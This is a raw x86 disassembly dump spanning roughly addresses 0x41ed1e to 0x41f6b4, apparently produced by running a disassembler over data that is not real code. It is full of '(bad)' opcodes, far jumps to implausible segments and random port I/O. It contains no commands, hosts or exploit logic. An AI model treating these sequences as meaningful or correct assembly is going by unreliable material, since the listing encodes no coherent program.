  41ed1e:	inc    ebp
  41ed1f:	pop    eax
  41ed20:	add    eax,0xdd5b74fa
  41ed25:	enter  0x4059,0x23
  41ed29:	xchg   esi,eax
  41ed2a:	mov    eax,0xc8c65935
  41ed2f:	push   edx
  41ed30:	shl    esp,1
  41ed32:	out    dx,eax
  41ed33:	aad    0xd8
  41ed35:	xchg   ebx,eax
  41ed36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed37:	or     BYTE PTR [eax],bl
  41ed39:	imul   ebp,DWORD PTR [ecx+0x51],0x25
  41ed3d:	add    BYTE PTR [edi+0x2a],cl
  41ed40:	rcl    DWORD PTR [ebx],0x7d
  41ed43:	dec    ebp
  41ed44:	(bad)  
  41ed45:	ja     0x41edb0
  41ed47:	dec    esi
  41ed48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed49:	mov    al,ds:0xf46bce22
  41ed4e:	mov    eax,ds:0x8a841b49
  41ed53:	ficomp WORD PTR [edi]
  41ed55:	or     BYTE PTR [esi-0x4b07083a],cl
  41ed5b:	xchg   bl,cl
  41ed5d:	pop    edi
  41ed5e:	sub    ch,BYTE PTR [eax-0x334aa854]
  41ed64:	push   edi
  41ed65:	add    dl,BYTE PTR [edi]
  41ed67:	out    0x26,al
  41ed69:	jl     0x41ed3a
  41ed6b:	sbb    DWORD PTR [ebp-0x370841c1],0xb8296196
  41ed75:	imul   ebp,DWORD PTR [eax+0xf],0x82a86abd
  41ed7c:	(bad)  
  41ed7d:	(bad)  [eax+0x38117ffc]
  41ed83:	lahf   
  41ed84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed85:	fwait
  41ed86:	dec    ebp
  41ed87:	push   0xfffffffb
  41ed89:	not    DWORD PTR [edx]
  41ed8b:	in     al,0xc4
  41ed8d:	adc    esi,eax
  41ed8f:	sub    BYTE PTR [esp+esi*1-0x1998e350],dl
  41ed96:	dec    edx
  41ed97:	cmp    DWORD PTR [esi],ebp
  41ed99:	out    0x66,al
  41ed9b:	sub    al,0x9b
  41ed9d:	cld    
  41ed9e:	in     eax,0x81
  41eda0:	leave  
  41eda1:	xor    al,0xa9
  41eda3:	imul   ecx,DWORD PTR [ecx+0x31],0x61
  41eda7:	shl    DWORD PTR ds:0x8d11b4a0,1
  41edad:	sbb    al,0x9a
  41edaf:	or     al,0x8d
  41edb1:	jae    0x41ed54
  41edb3:	mov    ebp,0x2d
	...
  41ee14:	add    BYTE PTR [eax],al
  41ee16:	add    eax,0x7b197956
  41ee1b:	aas    
  41ee1c:	gs pop esi
  41ee1e:	mov    ds:0x9e75b0a2,al
  41ee23:	pop    ebp
  41ee24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee25:	inc    esp
  41ee26:	and    BYTE PTR [edi+0x1],al
  41ee29:	add    BYTE PTR [edi],al
  41ee2b:	add    DWORD PTR [eax],eax
  41ee2d:	add    ah,ah
  41ee2f:	jmp    0x41ee71
  41ee31:	fs mov esp,0xce772831
  41ee37:	push   esp
  41ee38:	(bad)  
  41ee39:	je     0x41ee6d
  41ee3b:	push   edi
  41ee3c:	rcr    esi,1
  41ee3e:	repz add eax,0x6b79e278
  41ee44:	rol    BYTE PTR [esi+0x4a],1
  41ee47:	adc    eax,0x71602217
  41ee4c:	sbb    DWORD PTR [edx+0x31ed5aa9],eax
  41ee52:	sbb    BYTE PTR [ebp-0x59],0xbd
  41ee56:	outs   dx,DWORD PTR ds:[esi]
  41ee57:	inc    esp
  41ee58:	sub    al,0x81
  41ee5a:	or     BYTE PTR [edx],ah
  41ee5c:	stc    
  41ee5d:	ja     0x41eea8
  41ee5f:	cs data16 mov al,0x9a
  41ee63:	adc    bh,dl
  41ee65:	fcomi  st,st(3)
  41ee67:	iret   
  41ee68:	pushf  
  41ee69:	mov    edi,0x5e8a02bc
  41ee6e:	xor    DWORD PTR fs:[esi+0x1b2920e],edx
  41ee75:	jg     0x41ee5b
  41ee77:	dec    eax
  41ee78:	adc    BYTE PTR [edx-0x108ddea5],ch
  41ee7e:	mov    ecx,0x15933c14
  41ee83:	adc    eax,0xb4cdc0ba
  41ee88:	sbb    eax,0x4747be4a
  41ee8d:	inc    ebx
  41ee8e:	ss mov eax,0xa592643
  41ee94:	lds    ecx,FWORD PTR [ecx-0x5b03cfd2]
  41ee9a:	add    ecx,DWORD PTR [di+0x43]
  41ee9e:	sbb    eax,0x5e86e38d
  41eea3:	push   edx
  41eea4:	inc    esi
  41eea5:	retf   0x4f5
  41eea8:	inc    esp
  41eea9:	mov    eax,ds:0xee744b14
  41eeae:	in     al,dx
  41eeaf:	fadd   st,st(1)
  41eeb1:	cmp    eax,0xfec953f0
  41eeb6:	adc    DWORD PTR [ecx-0x4e903dcd],ebp
  41eebc:	jecxz  0x41eeb2
  41eebe:	scas   al,BYTE PTR es:[edi]
  41eebf:	popa   
  41eec0:	stc    
  41eec1:	outs   dx,BYTE PTR ds:[esi]
  41eec2:	or     ebx,esp
  41eec4:	dec    esp
  41eec5:	lahf   
  41eec6:	les    edi,FWORD PTR [ecx-0x15]
  41eec9:	cmp    eax,0x8c10b26
  41eece:	sub    bh,al
  41eed0:	cmc    
  41eed1:	icebp  
  41eed2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eed3:	sub    eax,0x57265cb8
  41eed8:	bnd jae 0x41ef16
  41eedb:	idiv   ebx
  41eedd:	ret    
  41eede:	neg    BYTE PTR [edx]
  41eee0:	arpl   WORD PTR [ebp+esi*1+0x43f6ac46],bx
  41eee7:	jo     0x41ef4d
  41eee9:	scas   eax,DWORD PTR es:[edi]
  41eeea:	int3   
  41eeeb:	sub    al,0x1
  41eeed:	cld    
  41eeee:	jge    0x41ef12
  41eef0:	fwait
  41eef1:	jl     0x41eeeb
  41eef3:	dec    ecx
  41eef4:	cmp    al,0xb3
  41eef6:	or     bh,dl
  41eef8:	iret   
  41eef9:	jo     0x41eecc
  41eefb:	shl    dh,1
  41eefd:	test   eax,0xd0dc1bb7
  41ef02:	inc    esp
  41ef03:	adc    ch,BYTE PTR [ebp+0x74]
  41ef06:	push   ds
  41ef07:	jo     0x41ee89
  41ef09:	jl     0x41ee94
  41ef0b:	bound  ebp,QWORD PTR [ebx+ebp*8]
  41ef0e:	cmp    eax,0xa76257b5
  41ef13:	mov    eax,DWORD PTR ds:0x1302e45d
  41ef19:	push   ebp
  41ef1a:	mov    ds:0xf8d48331,al
  41ef1f:	fs dec ecx
  41ef21:	sbb    al,0xec
  41ef23:	add    al,0xa9
  41ef25:	adc    eax,0xa865b004
  41ef2a:	leave  
  41ef2b:	fwait
  41ef2c:	sbb    BYTE PTR [ebp+0x34e417b5],0xb6
  41ef33:	cmp    DWORD PTR [ecx+0x0],esi
	...
  41ef96:	mov    ecx,0xff25bf5d
  41ef9b:	out    0xbb,eax
  41ef9d:	fnstsw WORD PTR [eax-0x2e0314c8]
  41efa3:	sub    eax,0x48279df1
  41efa8:	add    DWORD PTR [eax],eax
  41efaa:	pop    es
  41efab:	add    DWORD PTR [eax],eax
  41efad:	add    ch,cl
  41efaf:	xor    BYTE PTR [eax],bh
  41efb1:	dec    edi
  41efb2:	mov    dh,0xb6
  41efb4:	xchg   esp,eax
  41efb5:	push   cs
  41efb6:	pushf  
  41efb7:	aas    
  41efb8:	mov    ebx,0x57697bc
  41efbd:	loopne 0x41efa9
  41efbf:	inc    ecx
  41efc0:	test   BYTE PTR [ecx*1-0x48aad86d],ah
  41efc7:	in     eax,dx
  41efc8:	repz cmp esi,DWORD PTR [esi+0x6d39f940]
  41efcf:	hlt    
  41efd0:	pop    edi
  41efd1:	xor    BYTE PTR [eax],ah
  41efd3:	fild   DWORD PTR [ecx-0x44]
  41efd6:	or     ah,BYTE PTR [ebx-0x1afd052a]
  41efdc:	pop    es
  41efdd:	mov    eax,0xe7b27222
  41efe2:	pop    ebp
  41efe3:	mov    edi,ebx
  41efe5:	jl     0x41f009
  41efe7:	sar    DWORD PTR [ecx-0x7],1
  41efea:	or     DWORD PTR [eax],0x30
  41efed:	xchg   edx,eax
  41efee:	mov    ds:0xd99959a3,al
  41eff3:	stos   DWORD PTR es:[edi],eax
  41eff4:	jae    0x41ef98
  41eff6:	jno    0x41f031
  41eff8:	mov    ebp,0x6e358905
  41effd:	jae    0x41f05d
  41efff:	ret    0x9d45
  41f002:	js     0x41efee
  41f004:	pop    ebx
  41f005:	dec    edi
  41f006:	push   0xffffff93
  41f008:	pop    esp
  41f009:	cmp    ah,dl
  41f00b:	pop    ecx
  41f00c:	dec    edi
  41f00d:	hlt    
  41f00e:	es jl  0x41f03d
  41f011:	jmp    0x3e684c7e
  41f016:	shl    BYTE PTR [eax],1
  41f018:	loope  0x41f05e
  41f01a:	mov    ds:0x68744fe1,eax
  41f01f:	scas   al,BYTE PTR es:[edi]
  41f020:	test   edx,ebx
  41f022:	sub    DWORD PTR [edx],edx
  41f024:	shl    DWORD PTR [ebx],1
  41f026:	fcomp  st(3)
  41f028:	xchg   ebp,eax
  41f029:	dec    DWORD PTR [ecx]
  41f02b:	mov    al,ds:0xe5070704
  41f030:	jo     0x41f00b
  41f032:	aas    
  41f033:	sbb    eax,0x6cb00a53
  41f038:	sub    DWORD PTR [esp+ebp*1],ebp
  41f03b:	jmp    0x6785:0xb297c2f1
  41f042:	dec    edi
  41f043:	push   cs
  41f044:	imul   esi,DWORD PTR [edi-0x3b4ebf4f],0xffffffa8
  41f04b:	outs   dx,DWORD PTR ds:[esi]
  41f04c:	dec    esi
  41f04d:	stos   BYTE PTR es:[edi],al
  41f04e:	sbb    ebp,ebp
  41f050:	mov    cl,0x6a
  41f052:	mov    ds,WORD PTR [esp+ebx*1-0x71]
  41f056:	or     eax,0x24a782ea
  41f05b:	push   es
  41f05c:	adc    cl,BYTE PTR [eax]
  41f05e:	in     eax,dx
  41f05f:	ins    BYTE PTR es:[edi],dx
  41f060:	pop    ebx
  41f061:	nop
  41f062:	nop
  41f063:	jl     0x41f043
  41f065:	std    
  41f066:	xchg   ebp,eax
  41f067:	mov    edx,0x66e01156
  41f06c:	aaa    
  41f06d:	data16 loop 0x41f0bd
  41f070:	fsubr  QWORD PTR [ecx]
  41f072:	daa    
  41f073:	and    eax,0x1b8bb093
  41f078:	xor    DWORD PTR [edi-0x51a8faa],esi
  41f07e:	popf   
  41f07f:	mov    ds:0x8519954a,eax
  41f084:	sub    edx,ebp
  41f086:	push   0x900afa0a
  41f08b:	out    dx,eax
  41f08c:	mov    dh,0x7d
  41f08e:	jbe    0x41f0b5
  41f090:	in     al,dx
  41f091:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f092:	or     DWORD PTR [eax-0x65],esp
  41f095:	pusha  
  41f096:	push   ecx
  41f097:	add    eax,0xc9c29113
  41f09c:	adc    BYTE PTR [esi-0x364b79cf],dl
  41f0a2:	adc    al,0xe5
  41f0a4:	out    dx,al
  41f0a5:	jl     0x41f05c
  41f0a7:	cmc    
  41f0a8:	std    
  41f0a9:	add    dh,BYTE PTR [eax-0xee6a922]
  41f0af:	lahf   
  41f0b0:	ins    DWORD PTR es:[edi],dx
  41f0b1:	adc    bl,BYTE PTR [ebx+0x66]
  41f0b4:	jmp    0x0:0x0
	...
  41f113:	add    BYTE PTR [eax],al
  41f115:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f11b:	mov    ebx,0x6df0ffdf
  41f120:	sub    dh,BYTE PTR [ecx+0x2b14ffcc]
  41f126:	cs dec ecx
  41f128:	add    DWORD PTR [eax],eax
  41f12a:	pop    es
  41f12b:	add    DWORD PTR [eax],eax
  41f12d:	add    ch,al
  41f12f:	sub    BYTE PTR [ebx],bl
  41f131:	popa   
  41f132:	inc    ebx
  41f133:	xchg   esi,eax
  41f134:	imul   DWORD PTR ds:0x1e5a5991
  41f13a:	retf   0xab00
  41f13d:	add    cl,bh
  41f13f:	sahf   
  41f140:	xor    BYTE PTR [ecx+0x3a],al
  41f143:	mov    bh,0xd1
  41f145:	fwait
  41f146:	add    al,BYTE PTR [ebx+0x68e2120f]
  41f14c:	sub    BYTE PTR es:[esi+0x39fb6b91],bl
  41f153:	or     DWORD PTR [eax+0x68f231a1],ecx
  41f159:	cdq    
  41f15a:	out    0x61,eax
  41f15c:	mov    ds:0x9ee6427f,al
  41f161:	sub    esi,DWORD PTR [esi]
  41f163:	(bad)  [ecx-0x59274415]
  41f169:	push   ebx
  41f16a:	and    BYTE PTR [esi],ch
  41f16c:	push   ds
  41f16d:	adc    dl,BYTE PTR [edi]
  41f16f:	mov    ch,0x6
  41f171:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f172:	cmp    eax,0xdbdeb7a7
  41f177:	out    dx,al
  41f178:	ret    0x1179
  41f17b:	jne    0x41f14b
  41f17d:	aaa    
  41f17e:	(bad)  
  41f17f:	xor    eax,0x6d8f23e2
  41f184:	sar    DWORD PTR [eax+0x11],cl
  41f187:	mov    eax,0x3410be2a
  41f18c:	ja     0x41f158
  41f18e:	shl    DWORD PTR [ebx],cl
  41f190:	push   cs
  41f191:	or     al,0x65
  41f193:	cmp    al,0xe2
  41f195:	nop
  41f196:	inc    ebx
  41f197:	std    
  41f198:	adc    BYTE PTR [ebp+ecx*8-0x7f92646d],al
  41f19f:	add    al,0x4a
  41f1a1:	dec    esp
  41f1a2:	sub    DWORD PTR [ebx-0x54],ecx
  41f1a5:	push   ss
  41f1a6:	cmp    DWORD PTR [eax+ebp*4],ebx
  41f1a9:	mov    edx,DWORD PTR [edx-0x32f7ce8e]
  41f1af:	sub    BYTE PTR [eax+0x21],ch
  41f1b2:	enter  0x7f55,0x94
  41f1b6:	imul   esp,DWORD PTR [esi],0x5064be6b
  41f1bc:	cld    
  41f1bd:	int    0x14
  41f1bf:	mov    ds:0x5b0cd14f,al
  41f1c4:	cs dec edi
  41f1c6:	lock idiv DWORD PTR ds:0xb35031c0
  41f1cd:	iret   
  41f1ce:	xor    eax,0x6964e887
  41f1d3:	push   esp
  41f1d4:	cmp    eax,0x3cb2b6e3
  41f1d9:	mov    dl,0x40
  41f1db:	or     DWORD PTR [edi+0x6f1f5af5],ebp
  41f1e1:	ds inc ebp
  41f1e3:	loopne 0x41f229
  41f1e5:	mov    bh,BYTE PTR [ecx]
  41f1e7:	cmp    al,0x3d
  41f1e9:	fwait
  41f1ea:	add    DWORD PTR [ecx-0x46656d39],esp
  41f1f0:	xor    dl,bl
  41f1f2:	pop    ds
  41f1f3:	repnz pop edi
  41f1f5:	lods   eax,DWORD PTR ds:[esi]
  41f1f6:	sub    ecx,DWORD PTR [eax+0x6a]
  41f1f9:	sub    DWORD PTR ds:[esi-0x50693973],eax
  41f200:	and    esi,ebp
  41f202:	cmp    dl,cl
  41f204:	arpl   WORD PTR [ecx-0x53],bx
  41f207:	aas    
  41f208:	test   DWORD PTR [edx+0x5d17a351],eax
  41f20e:	and    esi,DWORD PTR [ebx+0x248a26d6]
  41f214:	xchg   esi,eax
  41f215:	lods   eax,DWORD PTR ds:[esi]
  41f216:	das    
  41f217:	mov    eax,0xb6b8ef07
  41f21c:	je     0x41f1aa
  41f21e:	push   esi
  41f21f:	mov    es,edi
  41f221:	jo     0x41f29c
  41f223:	in     eax,0x9d
  41f225:	xchg   ebp,eax
  41f226:	aas    
  41f227:	(bad)
  41f22a:	xchg   dh,al
  41f22c:	xor    eax,0x97a2c743
  41f231:	xor    BYTE PTR [esi+ebx*4],0xc2
	...
  41f295:	add    BYTE PTR [ecx+0x1b],dl
  41f298:	jmp    DWORD PTR [esi-0x1]
  41f29b:	out    0xd9,al
  41f29d:	aas    
  41f29e:	push   eax
  41f29f:	xor    DWORD PTR [edi-0x14],ebx
  41f2a2:	dec    ebp
  41f2a3:	(bad)  
  41f2a4:	jmp    0x18c288b
  41f2a9:	add    BYTE PTR [edi],al
  41f2ab:	add    DWORD PTR [eax],eax
  41f2ad:	add    BYTE PTR [esi+0x96a1a05],ah
  41f2b3:	ret    0xa5d6
  41f2b6:	jmp    0x1bd45e71
  41f2bb:	mov    dh,BYTE PTR [edx-0x5820d88e]
  41f2c1:	pop    edx
  41f2c2:	pop    eax
  41f2c3:	push   eax
  41f2c4:	sbb    al,0xe0
  41f2c6:	xchg   DWORD PTR [ecx+0x29089df1],esi
  41f2cc:	jle    0x41f267
  41f2ce:	mov    esi,0xc74393c9
  41f2d3:	push   es
  41f2d4:	fyl2xp1 
  41f2d6:	cmp    BYTE PTR [eax-0x26],bh
  41f2d9:	aaa    
  41f2da:	xchg   edx,eax
  41f2db:	fcomi  st,st(1)
  41f2dd:	adc    eax,0xe8c50844
  41f2e2:	mov    DWORD PTR [edi],ecx
  41f2e4:	xchg   edi,eax
  41f2e5:	outs   dx,DWORD PTR ds:[esi]
  41f2e6:	pop    ebx
  41f2e7:	and    al,0x30
  41f2e9:	xchg   esi,eax
  41f2ea:	shr    bl,1
  41f2ec:	mov    dh,0x57
  41f2ee:	cmc    
  41f2ef:	mov    DWORD PTR [esi],esp
  41f2f1:	loope  0x41f32e
  41f2f3:	mov    ds:0x87864921,al
  41f2f8:	and    BYTE PTR [edi-0x31f45ea4],bl
  41f2fe:	mov    ds:0xa55b2933,al
  41f303:	xor    ebp,DWORD PTR [ecx]
  41f305:	sbb    eax,0xd92858ad
  41f30a:	pop    ss
  41f30b:	push   ebp
  41f30c:	inc    edi
  41f30d:	or     bl,al
  41f30f:	mov    dh,0xa
  41f311:	sahf   
  41f312:	xchg   edx,eax
  41f313:	sub    BYTE PTR [edx],ah
  41f315:	xor    DWORD PTR [edx-0x39],0x7c
  41f319:	mov    ch,ch
  41f31b:	inc    eax
  41f31c:	jne    0x41f2ec
  41f31e:	push   es
  41f31f:	mov    ecx,0xc95337b8
  41f324:	push   eax
  41f325:	lock jbe 0x41f3a4
  41f328:	mov    edx,DWORD PTR [edi-0x3cf24710]
  41f32e:	pop    es
  41f32f:	ja     0x41f343
  41f331:	xchg   ebx,eax
  41f332:	mov    edi,DWORD PTR [eax]
  41f334:	out    0x20,eax
  41f336:	adc    al,0x37
  41f338:	xchg   ecx,eax
  41f339:	rol    BYTE PTR [ebx+0x7b0c96fe],1
  41f33f:	pop    ds
  41f340:	mov    BYTE PTR [ebx-0x56],bh
  41f343:	cwde   
  41f344:	imul   eax,DWORD PTR [ebx],0xffffff89
  41f347:	sub    BYTE PTR [ebp+0x78c7d678],ah
  41f34d:	xchg   ebp,eax
  41f34f:	stos   BYTE PTR es:[edi],al
  41f350:	sub    ebx,DWORD PTR [ebp-0x33]
  41f353:	pop    ebx
  41f354:	je     0x41f2ea
  41f356:	add    al,0xbc
  41f358:	dec    ebp
  41f359:	std    
  41f35a:	leave  
  41f35b:	aad    0x39
  41f35d:	fnstenv [eax]
  41f35f:	imul   edi,DWORD PTR ds:0x9733072d,0x49
  41f366:	inc    esi
  41f367:	ds xchg ebx,eax
  41f369:	mov    edx,0x4a21618b
  41f36e:	arpl   WORD PTR [eax+0x4a],si
  41f371:	in     eax,dx
  41f372:	clc    
  41f373:	jecxz  0x41f366
  41f375:	fistp  WORD PTR [edx+0x6]
  41f378:	jae    0x41f367
  41f37a:	or     eax,0x84fa7588
  41f37f:	pop    esp
  41f380:	mov    eax,ds:0x21b34bba
  41f385:	js     0x41f3b2
  41f387:	dec    ecx
  41f388:	lahf   
  41f389:	test   DWORD PTR [ecx],esp
  41f38b:	pop    ds
  41f38c:	inc    ebx
  41f38d:	jb     0x41f336
  41f38f:	xor    DWORD PTR [ebx],ecx
  41f391:	ja     0x41f385
  41f393:	pop    es
  41f394:	adc    DWORD PTR [ebx-0x5e],ebx
  41f397:	mov    BYTE PTR [ebx+edi*1-0x68ecc98d],ch
  41f39e:	ret    0x543b
  41f3a1:	clc    
  41f3a2:	mov    ah,0x60
  41f3a4:	ins    DWORD PTR es:[edi],dx
  41f3a5:	repz test BYTE PTR [ecx-0x65fd2cb2],bl
  41f3ac:	popa   
  41f3ad:	mov    esp,0x158388bc
  41f3b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f3b3:	jecxz  0x41f395
	...
  41f415:	add    BYTE PTR [edi+eiz*8],bh
  41f418:	imul   ebp,edi,0xfffffffb
  41f41b:	out    dx,eax
  41f41c:	mov    esp,0xc961c5f7
  41f421:	xchg   edx,eax
  41f422:	mov    esp,0x3c0421b2
  41f427:	dec    ebx
  41f428:	add    DWORD PTR [eax],eax
  41f42a:	pop    es
  41f42b:	add    DWORD PTR [eax],eax
  41f42d:	add    BYTE PTR [ecx+0x7c252bd],bh
  41f433:	jl     0x41f494
  41f435:	repnz popa 
  41f437:	loope  0x41f3e5
  41f439:	push   edx
  41f43a:	adc    eax,0x44d7656c
  41f43f:	xor    BYTE PTR [edx],dl
  41f441:	scas   al,BYTE PTR es:[edi]
  41f442:	scas   eax,DWORD PTR es:[edi]
  41f443:	aad    0x8f
  41f445:	sub    bl,BYTE PTR [eax+0x1e]
  41f448:	pop    edx
  41f449:	xchg   ebp,eax
  41f44a:	arpl   WORD PTR [esi+edi*8-0x47],si
  41f44e:	lahf   
  41f44f:	sbb    eax,0xb7789ffb
  41f454:	out    0x0,eax
  41f456:	cdq    
  41f457:	pop    es
  41f458:	fld    DWORD PTR [edi]
  41f45a:	sti    
  41f45b:	push   ss
  41f45c:	fwait
  41f45d:	jg     0x41f4d2
  41f45f:	jbe    0x41f484
  41f461:	inc    edi
  41f462:	push   ebx
  41f463:	adc    esi,DWORD PTR [edi]
  41f465:	xchg   DWORD PTR [edx],ecx
  41f467:	out    dx,eax
  41f468:	out    0xa1,eax
  41f46a:	js     0x41f43e
  41f46c:	and    eax,0x46b37876
  41f471:	mov    DWORD PTR fs:[ebx],eax
  41f474:	mov    ds:0xfc5ed0f1,eax
  41f479:	das    
  41f47a:	mov    esi,0xd69f23a3
  41f47f:	cwde   
  41f480:	adc    al,0x82
  41f482:	ja     0x41f4ff
  41f484:	jmp    FWORD PTR [edx+0x1]
  41f487:	scas   al,BYTE PTR es:[edi]
  41f488:	aad    0xa9
  41f48a:	mov    dh,0x6a
  41f48c:	adc    bl,BYTE PTR [esi-0xe]
  41f48f:	es jno 0x41f4ba
  41f492:	or     esp,ecx
  41f494:	pop    eax
  41f495:	add    bh,bh
  41f497:	mov    DWORD PTR [ecx-0x38],eax
  41f49a:	popf   
  41f49b:	sbb    al,BYTE PTR [ebp-0x1ac2cc76]
  41f4a1:	hlt    
  41f4a2:	in     al,0xec
  41f4a4:	jecxz  0x41f48b
  41f4a6:	les    esi,FWORD PTR cs:[edi]
  41f4a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4aa:	xor    BYTE PTR [edi+0x7d],0xb3
  41f4ae:	test   bl,cl
  41f4b0:	adc    ch,ah
  41f4b2:	ret    
  41f4b3:	jl     0x41f491
  41f4b5:	sub    eax,edx
  41f4b7:	or     ch,dh
  41f4b9:	push   cs
  41f4ba:	stos   BYTE PTR es:[edi],al
  41f4bb:	mov    WORD PTR [ebx+0x73],cs
  41f4be:	xlat   BYTE PTR ds:[ebx]
  41f4bf:	hlt    
  41f4c0:	repz (bad) 
  41f4c2:	xlat   BYTE PTR ds:[ebx]
  41f4c3:	jae    0x41f495
  41f4c5:	jae    0x41f524
  41f4c7:	xchg   BYTE PTR [ebx-0x76],dh
  41f4ca:	pop    ss
  41f4cb:	out    dx,eax
  41f4cc:	dec    eax
  41f4cd:	adc    eax,0xc016ca4a
  41f4d2:	xchg   ebp,eax
  41f4d3:	hlt    
  41f4d4:	clc    
  41f4d5:	cmp    eax,0x996fe435
  41f4da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f4db:	push   cs
  41f4dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4dd:	add    ebp,edx
  41f4df:	cmp    DWORD PTR [ecx+eiz*2-0x7d870ed8],ecx
  41f4e6:	pusha  
  41f4e7:	mov    DWORD PTR [ecx+0xd18d911],0xb07983a
  41f4f1:	inc    esi
  41f4f2:	(bad)  
  41f4f3:	mov    ds:0xb5be9162,eax
  41f4f8:	xor    bl,dh
  41f4fa:	ret    0xcaf9
  41f4fd:	sbb    al,0x15
  41f4ff:	jecxz  0x41f52c
  41f501:	push   ss
  41f502:	push   0x5b54f407
  41f507:	daa    
  41f508:	mov    ds:0xc9c019b2,al
  41f50d:	imul   DWORD PTR [ebx+0x25]
  41f510:	stos   DWORD PTR es:[edi],eax
  41f511:	fisttp QWORD PTR [ebx]
  41f513:	mov    ds:0xfdb69378,al
  41f518:	push   0x61b08fb6
  41f51d:	loope  0x41f578
  41f51f:	cmp    DWORD PTR [ecx+0x15bbffcc],esp
  41f525:	pop    ss
  41f526:	retf   
  41f527:	add    DWORD PTR [eax],esi
  41f529:	retf   0xe557
  41f52c:	(bad)  
  41f52d:	jmp    0x912c:0x55fec420
  41f534:	stc    
	...
  41f595:	add    BYTE PTR [eax+0x34],bh
  41f598:	add    bh,bl
  41f59a:	dec    esi
  41f59b:	(bad)  
  41f59c:	stc    
  41f59d:	mov    bh,0x14
  41f59f:	pop    ebp
  41f5a0:	sub    cl,ah
  41f5a2:	jg     0x41f587
  41f5a4:	adc    esp,DWORD PTR [ebx]
  41f5a6:	inc    ebx
  41f5a7:	dec    esp
  41f5a8:	add    DWORD PTR [eax],eax
  41f5aa:	pop    es
  41f5ab:	add    DWORD PTR [eax],eax
  41f5ad:	add    al,dl
  41f5af:	aas    
  41f5b0:	jmp    0x5d0a57d5
  41f5b5:	mov    bh,0x25
  41f5b7:	test   BYTE PTR [ecx+0x1e5d9409],ah
  41f5bd:	fisttp DWORD PTR [ebp-0x60]
  41f5c0:	aam    0x26
  41f5c2:	or     al,0x81
  41f5c4:	jl     0x41f5c6
  41f5c6:	push   esp
  41f5c7:	sbb    BYTE PTR [edx+esi*2-0x5682ae0b],al
  41f5ce:	cli    
  41f5cf:	push   esi
  41f5d0:	fld    DWORD PTR [edx-0x25]
  41f5d3:	mov    WORD PTR [eax-0x14127dfb],?
  41f5d9:	adc    al,0x3c
  41f5db:	mov    dh,0x44
  41f5dd:	test   eax,0x5b99078f
  41f5e2:	dec    ebp
  41f5e3:	repz dec ebp
  41f5e5:	rcr    ecx,1
  41f5e7:	mov    dh,0xd7
  41f5e9:	cmp    bl,BYTE PTR [ecx]
  41f5eb:	scas   al,BYTE PTR es:[edi]
  41f5ec:	in     eax,dx
  41f5ed:	jmp    0xbc2d:0xd8b2576c
  41f5f4:	or     cl,dh
  41f5f6:	sbb    esi,DWORD PTR [edx-0x7b321b2e]
  41f5fc:	inc    eax
  41f5fd:	xchg   edx,eax
  41f5fe:	cmp    dh,al
  41f600:	jbe    0x41f658
  41f602:	pop    ss
  41f603:	push   es
  41f604:	inc    ebp
  41f605:	push   ebp
  41f606:	fst    QWORD PTR [ebx-0x2b]
  41f609:	(bad)  
  41f60a:	cmp    ah,BYTE PTR [edx-0x70]
  41f60d:	dec    esp
  41f60e:	cmp    edi,DWORD PTR [esi-0x766d9970]
  41f614:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  41f616:	xor    al,cl
  41f618:	pop    esp
  41f619:	lea    edx,[ecx]
  41f61b:	mov    bl,cl
  41f61d:	int3   
  41f61e:	mov    edx,DWORD PTR [edx]
  41f620:	jp     0x41f5fd
  41f622:	add    DWORD PTR [eax+ecx*8+0xe],esi
  41f626:	xor    eax,0x94675141
  41f62b:	aad    0xa9
  41f62d:	jmp    0x41f65f
  41f62f:	jns    0x41f63b
  41f631:	xchg   ebp,eax
  41f632:	mov    DWORD PTR [eax+0x5],0x4d156d08
  41f639:	mov    ch,BYTE PTR [ebx]
  41f63b:	lods   al,BYTE PTR fs:[esi]
  41f63d:	in     al,dx
  41f63e:	loop   0x41f5ee
  41f640:	add    edx,ecx
  41f642:	enter  0x91fb,0xd8
  41f646:	retf   0x800a
  41f649:	mov    cl,0xf8
  41f64b:	jno    0x41f640
  41f64d:	dec    ecx
  41f64e:	clc    
  41f64f:	je     0x41f66f
  41f651:	inc    edx
  41f652:	es ret 
  41f654:	out    0x8,eax
  41f656:	je     0x41f696
  41f658:	dec    ecx
  41f659:	dec    esp
  41f65a:	jbe    0x41f656
  41f65c:	mov    edi,0xdfeed9a3
  41f661:	int3   
  41f662:	xchg   ebp,eax
  41f663:	outs   dx,BYTE PTR ds:[esi]
  41f664:	fdiv   DWORD PTR [ebx-0x13]
  41f667:	js     0x41f6d3
  41f669:	adc    eax,0x581d4b53
  41f66e:	pop    ecx
  41f66f:	jo     0x41f6e3
  41f671:	xor    eax,0xee9e9ff9
  41f676:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f677:	xchg   ecx,eax
  41f678:	sahf   
  41f679:	and    BYTE PTR [ecx+0xa],cl
  41f67c:	je     0x41f6b8
  41f67e:	xchg   BYTE PTR [ebp+edi*8-0x3ea46224],ch
  41f685:	xor    bl,BYTE PTR [ebx]
  41f687:	dec    esi
  41f688:	repz pop edx
  41f68a:	sub    al,0x62
  41f68c:	adc    bl,ch
  41f68e:	cmp    dh,BYTE PTR [esi+0x9]
  41f691:	pop    ebx
  41f692:	mov    BYTE PTR [ecx-0x42],bl
  41f695:	dec    ecx
  41f696:	int3   
  41f697:	xchg   BYTE PTR ds:0xde6917ad,dh
  41f69d:	or     eax,0x8eb45960
  41f6a2:	call   FWORD PTR [edx+edi*4]
  41f6a5:	scas   eax,DWORD PTR es:[edi]
  41f6a6:	push   0x60
  41f6a8:	xchg   ah,ah
  41f6aa:	mov    ebx,0x7638d439
  41f6af:	push   eax
  41f6b0:	pop    esp
  41f6b1:	mov    bl,0x7c
  41f6b3:	pop    edx
  41f6b4:	sbb    DWORD PTR [eax],eax
	...
